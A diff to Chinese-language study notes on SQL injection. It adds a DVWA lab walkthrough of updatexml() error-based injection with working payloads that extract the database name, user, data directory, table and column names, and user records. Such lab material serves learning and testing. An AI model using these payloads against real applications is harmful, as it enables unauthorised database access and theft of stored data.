@@ -12,3 +12,19 @@ SQL注入：攻击者通过构造合适的输入，实现对数据库的操作
   页面无任何结果显示
 4.宽字节注入
   数据库编码为GBK时，可以使用宽字节注入
+
+
+
+
+1.利用过程之SQL报错注入
+updatexml（）报错注入实战（基于dvwa平台）
+前景提示：本人在虚拟机中搭建好了dvwa平台，在本机中完成SQL注入实战,加载dvwa直接进入SQL注入模块，我这里的等级为low。
+爆出数据库及相关信息
+1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#
+爆当前数据库表信息
+1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
+ 注：此处使用group_concat（）函数进行输出，否则会出现错误。
+爆user表字段信息
+1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'),0x7e),1) #
+爆数据库内容
+1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #
